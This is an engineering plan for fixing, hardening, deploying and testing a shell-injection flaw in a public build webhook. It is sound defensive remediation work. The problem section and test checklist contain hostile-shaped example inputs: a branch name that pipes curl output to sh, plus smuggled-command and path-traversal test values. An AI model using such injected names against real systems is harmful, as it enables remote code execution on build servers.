# Webhook name injection: fix, hardening, deploy and test plan

## Status (2026-10-31): Phases A and B deployed and verified

| Piece | Now in production |
|---|---|
| Trigger | Cloud Function version 53 (from `31b1070`): name validation and hardened `job.json` |
| `ig-build:latest` | `sha256:dcdd24400683…` = April image + fixed `publish` and `watch-and-publish` (also tagged `hotfix-20261031`) |
| `ci-build:latest` | `sha256:439eea842025…` = February image + `publish-ig` name check (also tagged `hotfix-20261031`) |
| ci-build Deployment | RuntimeDefault seccomp, `allowPrivilegeEscalation: false` on both containers, busybox init |
| Caddyfile | master's, including the OPTIONS → 204 change (`26b8de5`) |

How it was verified:
- **Local copy (`k8s/local/`):** the exploit ran on the old code (a command executed on ci-build as `fhir_upload`) and failed on the new.
- **Production:** the trigger returns 400 for every attack shape. `jmandel/ig-build-test` builds publish on master, `t+ü,x` and the failure path, with QA counts identical to before. `check-hosting.sh` passes, and OPTIONS returns 204.
- **Hardening:** checked in `/proc` on GKE. Build containers run as uid 1000 with no capabilities, `NoNewPrivs: 1` and `Seccomp: 2`. The ci-build containers run as root with no_new_privs and seccomp.
- **Real IGs under the hardened job spec, built locally:** sample-ig, testMermaid, FHIRPath, cds-hooks and MADFSH match production's QA counts with no permission errors. MADFSH has one extra error: a tx.fhir.org cache that expired after 30 idle minutes, because the local VM's disk made the build slow.

Later the same day (all verified in production):
- **Images rebuilt from their Dockerfiles** (Phase C) as `:rebuild-20261031`, now `latest`:
  - `ci-build`: OpenSSH updates, plus an ssh dispatcher. The upload key may only run `publish`/`publish-ig`, with no shell, pty or forwarding.
  - `caddy-ratelimit`
  - `ig-build`: Java 21.0.13.

  An A/B of four IGs against the previous image gave identical file lists, QA counts and content, apart from timestamp/ordering noise.
- **Trigger version 56:** delete-race fix (UID precondition), no API token in build pods, safe-to-evict false. `k8s/local/test-burst.sh` passes in production.
- **Pod Security Admission** `enforce=baseline` on `fhir`.
- **Caddy:** zstd compression; `Cache-Control: no-cache` on HTML pages only. Measured in Chromium: no-cache on assets as well would turn 1–3 requests per page view into ~45.
- **Disk:** grown 1000 → 1500 GB (`resize2fs` online). Failed builds no longer upload the publisher's `temp/`, and interrupted uploads clean up their staging directory (80 leftovers, 5.6 GiB, removed).

Found and fixed along the way:
- **Upload sidecar hang (`1e7bbd6`):** the builder renames `done.temp` to `done`, and inotify reports that as `moved_to`, which the sidecar didn't watch for. On 2026-10-27, ansforge/interop-ig-fhir-document-patient-summary built but was never published, and its job held 22 GiB for 10 h.
- **Deploy order matters:** an unfixed sender against the fixed `publish-ig` is still injectable, because the remote shell splits the command before `publish-ig` runs. The trigger validation and the sender's quoting are the real fixes.
- **`setup-secret.sh`** relies on the current kubectl context's namespace being `fhir`. Run it with `--context … -n fhir`.

Follow-ups, not done:
- [ ] The cluster autoscaler (OPTIMIZE_UTILIZATION) evicts running build pods during scale-down. That happened to a test job today and to one real build in the last 14 days; jobs retry once. Consider the pod annotation `cluster-autoscaler.kubernetes.io/safe-to-evict: "false"` on build jobs.
- [ ] Watch real builds for a few days for permission errors: grep build logs for `Operation not permitted`/`EPERM`.
- [x] Phase C (full image rebuilds). [ ] Phase D (node upgrade to ≥1.35.9-gke.1390000 when the Regular channel has it; not urgent).
- [ ] Optional: make ci-build's sshd parse `SSH_ORIGINAL_COMMAND` itself (authorized_keys `command=`), so even an unquoted sender can't reach a shell.

Previous `latest` digests, for rollback: `ig-build@sha256:1125be02639f…`, `ci-build@sha256:536804945519…`; the trigger's previous code is `26b8de5`.

Branch: `fix/webhook-name-injection` (from `origin/master`), commits `0c235d6`, `73150f6`.

## The problem

The trigger is unauthenticated by design (anyone may retrigger a build), so
`repository.full_name` and `ref` are attacker-controlled. The branch name
reached the ci-build pod's shell: the upload sidecar runs
`ssh ci-build ./publish-ig "$@"`, and ssh joins its arguments into one string
that the remote shell parses again. A branch such as
`x;curl${IFS}host|sh` (a valid git ref) would run as `fhir_upload` on the
public ci-build pod, which can rewrite all of build.fhir.org. The trigger only
checks that `ig.ini` exists on that branch, which anyone can arrange in their
own repo. A local simulation confirmed the injection; it was not tried against
production.

The `done` file written by the build container takes the same path, so code
running inside a build could do the same.

## The fix (three layers)

1. `triggers/ig-commit-trigger/index.js`: 400 unless org, repo and branch match
   `^[\p{L}\p{N}._+,-]+$` and are not `.` or `..`.
2. `images/ig-publisher/ci-files/publish`: quote each argument with
   `printf '%q'` before ssh.
3. `images/ci-build/publish-ig`: refuse names outside the same set (bytes
   0x80-0xFF admit UTF-8 letters) before touching the web root.

`+`, `,` and non-ASCII letters are allowed because seven live branches use
them (from `ig/qas.json` on 2026-10-31). Both validators accept all 2,113
distinct names in qas.json and reject 18 malicious samples.

## Baseline (2026-10-31)

| Thing | Current |
|---|---|
| Cloud Function `ig-commit-trigger` | 1st gen, nodejs22, version 51, updated 2026-04-10T00:10Z |
| `ig-build:latest` | `sha256:1125be02639f9f6494e2fd0e71202a7be6e1cdd2bc31c15be402199ed399ca43` (2026-04-13) |
| `ci-build:latest` (running) | `sha256:536804945519a2bd9472a550ed52728c744b0d39ed2d2c86a1bac5c8d33a407e` (2026-02-09) |
| `caddy-ratelimit:latest` (running) | `sha256:fb514cbad23e5926bd382e05d53851ad8be2ec90388b92ab97be69adc690e5c9` (2025-11-14) |
| Cluster | 1.35.8-gke.1796000, Regular channel, all pools COS_CONTAINERD |
| ci-build and caddy processes | uid 0, `Seccomp: 0` (unconfined), `NoNewPrivs: 0` |

Drift between the repo and the live cluster. Don't apply these files by accident:

- **Service:** live `ci-build-service` still has port 81 (`webcaddy`), which
  `925d13f` removed from the repo. Nothing listens there, so applying the yaml
  is safe, but it is a change.
- **Caddyfile:** the live `caddy-conf-volume` lacks master's `26b8de5`
  (OPTIONS → 204). Applying the config map ships that too.
- **Deployment:** `ci-build.deployment.yaml` matches live (`kubectl diff` is
  empty).
- **Deployed function source:** unknown. The upload bucket returns 403. Jobs it
  creates carry `build.fhir.org/managed-by`, which `751cbe4` added, so the live
  code is probably at or near `751cbe4`, but this is unconfirmed.

## Phase 0: prepare

- [ ] Review the two commits; push the branch and open a PR (or merge to master).
- [x] Update README "Important Notes": the allowed name set is now letters,
      digits, `. _ + , -` (it says `[A-Za-z0-9_-]` today).
- [ ] Pick a test repo you own with an `ig.ini` (e.g. a tiny sample IG) and
      create branches: `main`, `t+ü,x` (allowed odd chars), and
      `x;touch${IFS}/tmp/pwned` (attack shape; harmless if it ever ran).
- [ ] Record "before" outputs for comparison: for 3 representative IGs
      (one HL7 sushi-based, one large like US Core, one with a custom
      template), save `qa.json` (errs/warnings/hints counts) and the tail of
      `build.log` from build.fhir.org.

## Phase A: ship the injection fix

Ship the hotfix images as thin layers on the current digests so that only the
script changes; a full rebuild pulls new Java/Ruby/Node/OS packages and should
be its own change (Phase D).

### A1. Trigger (closes the hole for new requests)

- [ ] `npm test` (and `npm run typecheck` once TypeScript is installed).
- [ ] Local safety check, no cluster writes (validation runs before any
      GitHub or k8s call): `npm start`, then
      `curl -s localhost:8080 -H 'Content-Type: application/json' -d '{"repository":{"full_name":"o/r"},"ref":"refs/heads/x;id"}'` → 400.
- [ ] Deploy with the README command **plus `--no-gen2`** (the function is 1st
      gen; without it gcloud tries 2nd gen and refuses).
- [ ] Note: this also ships anything in `751cbe4` that was not yet live.

Efficacy:
- [ ] Attack-shaped branch (curl to the function URL) → HTTP 400, and
      `kubectl -n fhir get jobs` shows no new job.
- [ ] `full_name` of `../x` and `o/r` with branch `..` → 400.

Regression:
- [ ] Push to the test repo `main` → job created, build publishes, Zulip
      notification appears.
- [ ] Push to `t+ü,x` → job created (publish will be tested after A2/A3).
- [ ] Dashboard "rebuild" button (`dashboard-next/src/rebuild.ts`) → job.
- [ ] GitHub App install path: a real push from an App-installed repo builds.
- [ ] GitHub `ping` delivery (no `ref`) → same "could not parse" 200 as before.
- [ ] `OPTIONS` preflight → 200 with CORS headers.
- [ ] `?action=sweep` (GET, dry run) → 200; Cloud Scheduler sweep job shows
      success on its next 5-minute run.

### A2. ig-build image (upload sidecar quoting)

- [ ] Build a thin hotfix image:
      `FROM gcr.io/fhir-org-starter-project/ig-build@sha256:1125be02…` +
      `COPY ci-files/publish /usr/local/bin/publish` (keep mode 755).
      Push as `ig-build:hotfix-20261031`, not `latest`.
- [ ] Test it in isolation: run the trigger locally with
      `IG_BUILD_IMAGE=…:hotfix-20261031 IG_TRIGGER_MANAGED_BY=ig-trigger-test IG_TRIGGER_JOB_PREFIX=igtest IG_TRIGGER_BRANCH_KEY_SCOPE=test`
      and post the test repo's `main` and `t+ü,x`. Production jobs are not
      affected; the publish still lands on build.fhir.org under your repo.
- [ ] Check the sidecar log shows one argument per value (e.g. the QA score
      "No QA File" arrives whole) and the publish succeeds.
- [ ] Retag `hotfix-20261031` as `latest` (jobs use `imagePullPolicy: Always`).

### A3. ci-build image (server-side check)

- [ ] Thin hotfix image: `FROM …/ci-build@sha256:53680494…` +
      `COPY publish-ig /home/fhir_upload/publish-ig` (mode 755). Push as
      `ci-build:hotfix-20261031`, then retag `latest`.
- [ ] `kubectl -n fhir rollout restart deployment/ci-build-deployment`.
      Single replica with a ReadWriteOnce disk: expect a short build.fhir.org
      outage. Pick a quiet time and make sure no upload is mid-flight
      (`kubectl -n fhir get jobs`).

Efficacy:
- [ ] `kubectl exec` into ci-build as fhir_upload:
      `./publish-ig org repo 'x;y' </dev/null` → "Refusing unsafe name", exit 2,
      nothing created under `~/uploading`.

Regression (static hosting and publishing):
- [ ] `https://build.fhir.org/` (core master), `/ig/`, `/ig/qas.json`,
      `/ig/builds.json` load; TLS certificate is valid (same issuer and expiry
      as before).
- [ ] A branch URL and a default-branch URL (`/ig/org/repo/`, through the
      `__default` symlink) for the test repo and one HL7 IG.
- [ ] Content negotiation: `Accept: application/fhir+json` on a resource page
      returns JSON.
- [ ] Failure path: push a deliberately broken commit to a test branch →
      `/branches/<b>/failure/build.log` appears.
- [ ] Reindexer: after a publish, `qas.json` includes the test repo within a
      few minutes; `kubectl logs … -c ci-build` shows "reindexing".
- [ ] `t+ü,x` branch publishes and its URL loads (percent-encoded).
- [ ] qas.json rate limit still applies to external IPs (101 fast requests →
      429).

## Phase B: container hardening

These change the runtime environment, so they can break things nobody knew
depended on them. Today every container is unconfined (no seccomp filter,
no_new_privs off) and ci-build and caddy run as root. Ship each piece on its
own after Phase A.

What each setting removes:
- **`seccompProfile: RuntimeDefault`:** blocks ~40 syscalls, including
  `unshare`/user namespaces, `mount`, `keyctl`, `bpf`, `ptrace` on other
  processes and `personality` flags. Things that would break: Chrome or
  Chromium's sandbox (puppeteer, mermaid-cli, PDF rendering), `strace`/`gdb`,
  and anything that builds its own sandbox with `bwrap`/`unshare`.
- **`allowPrivilegeEscalation: false`:** sets no_new_privs. setuid binaries
  (`sudo`, `su`, `ping` on some images) and file capabilities stop working.
  Processes already root keep their capabilities.
- **`capabilities.drop: [ALL]`:** only for non-root containers. Root daemons
  that switch user (sshd, supervisord) need CHOWN, SETUID, SETGID,
  SYS_CHROOT, etc.

### B1. Build jobs (`triggers/ig-commit-trigger/job.json`, both containers)

Already uid 1000. The image has no Chrome or puppeteer; publisher tools are
Java, Ruby/Jekyll, Node (sushi) and graphviz `dot`; there is no sudo or setuid
use in the scripts.

- [ ] Add `seccompProfile: RuntimeDefault` (pod), `runAsNonRoot: true`,
      `allowPrivilegeEscalation: false` and `capabilities.drop: [ALL]`
      (each container).
- [ ] Test with the isolated local-trigger setup from A2, using the edited
      local `job.json`, on the three "before" IGs plus the test repo. Compare
      qa.json counts and build.log endings with the baseline; grep build.log
      for `Operation not permitted`, `EPERM`, `seccomp`, `sandbox`.
- [ ] Deploy the trigger again (`job.json` is bundled with the function).
- [ ] Watch the next day of production builds: the failure rate on the
      dashboard should be no higher than before.

### B2. ci-build container (stays root: sshd and supervisord need it)

- [ ] Add `seccompProfile: RuntimeDefault` and `allowPrivilegeEscalation: false`;
      do **not** drop capabilities.
- [ ] Check before applying: `kubectl diff -f k8s/ci-build.deployment.yaml`
      shows only these lines.
- [ ] Tests: an ssh publish from a test job works (exercises sshd privilege
      separation, its own seccomp sandbox and PAM); the reindexer process runs
      as `fhir_upload` (`ps`); `/proc/1/status` shows `Seccomp: 2`,
      `NoNewPrivs: 1`.

### B3. caddy container

- [ ] Same two settings. It runs as root, so binding 80/443 still works.
- [ ] Tests: all Phase A3 hosting checks; `kubectl logs -c caddy` shows no
      TLS/ACME errors. Certificate renewal can't be forced safely; check
      again after the next renewal (certificates live on `caddy-cert-disk`).

### B4. Init container

- [ ] Replace `ubuntu:16.04` (end of life) with `busybox:1.37` for the
      `mkdir`/`chmod` step. Test: the pod starts and `/var/www` is writable.

## Phase C: rebuild images on current packages (separate change)

- [ ] `ci-build`: full rebuild from its Dockerfile (Ubuntu 22.04 updates since
      February). Test as A3.
- [ ] `ig-build`: full rebuild (`--target ci`) only after comparing builds of
      the three baseline IGs, since this changes publisher toolchain versions.

## Phase D: node upgrade for GCP-2026-071 (stolen emSign CA keys, not a kernel bug)

- [ ] The fix is 1.35.9-gke.1390000. The Regular channel offers only up to
      1.35.8-gke.1975000 today; wait for it, or apply the bulletin's
      CA-removal DaemonSet on the COS pools in the meantime.
- [ ] `build-fhir-org` has auto-upgrade off and hosts ci-build: upgrading it
      restarts the site. Do it deliberately and rerun the A3 hosting checks.

## Rollback

| Piece | How |
|---|---|
| Trigger | Redeploy from `26b8de5` (the commit before the fix) with the same command. |
| ig-build | `gcloud container images add-tag …/ig-build@sha256:1125be02639f… …/ig-build:latest` |
| ci-build | Retag `…/ci-build@sha256:536804945519…` as `latest`, then `rollout restart`. |
| Security contexts | `kubectl rollout undo deployment/ci-build-deployment -n fhir`; redeploy the trigger with the old `job.json`. |
